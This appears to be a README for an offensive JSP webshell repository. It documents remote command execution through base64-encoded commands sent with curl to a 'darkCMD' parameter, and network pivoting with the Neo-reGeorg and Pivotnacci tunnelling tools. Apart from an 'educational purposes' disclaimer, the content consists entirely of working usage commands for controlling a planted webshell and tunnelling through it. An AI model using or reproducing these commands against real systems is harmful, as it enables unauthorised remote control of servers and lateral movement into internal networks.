!!! Disclaimer !!! 

- The authors do not have any responsibility and/or liability for how you will use this information and the source code!
- Everything that anyone can find in this repository is only for educational and research purposes, and the authors have no responsibility for how you will use the data found.

JSP webshell with pivoting via Neo-reGeorg or Pivotnacci

1) Command exec via GET or POST

command(s) should be encoded in base64 (GET or POST) to support control operators, ex: id && ls -lah /

- curl -s 'http://127.0.0.1:8080/jsp-regeorg.jsp?uuid=form&darkCMD=aWQgJiYgbHMgLWxhaCAvCg=='
- curl -s -X POST -d 'uuid=form&darkCMD=aWQgJiYgbHMgLWxhaCAvCg==' -H 'Content-Type: application/x-www-form-urlencoded' 'http://127.0.0.1:8080/jsp-regeorg.jsp'
- curl -s 'http://127.0.0.1:8080/jsp-pivotnacci.jsp?uuid=form&darkCMD=aWQgJiYgbHMgLWxhaCAvCg=='
- curl -s -X POST -d 'uuid=form&darkCMD=aWQgJiYgbHMgLWxhaCAvCg==' -H 'Content-Type: application/x-www-form-urlencoded' 'http://127.0.0.1:8080/jsp-pivotnacci.jsp'


2.a) Pivoting usage Neo-reGeorg -> jsp-regeorg.jsp

pivoting using Neo-reGeorg (5.0.1), for other versions you have to update the relevant parts in the jsp file

- python neoreg.py -u 'http://127.0.0.1:8080/jsp-regeorg.jsp?uuid=test' -k PASSWORD -vvvvvvvv

2.b) Pivoting usage Pivotnacci -> jsp-pivotnacci.jsp

pivoting using pivotnacci (0.0.2), for other versions you have to update the relevant parts in the jsp file

- pivotnacci http://127.0.0.1:8080/jsp-pivotnacci.jsp --password PASSWORD -vvvv
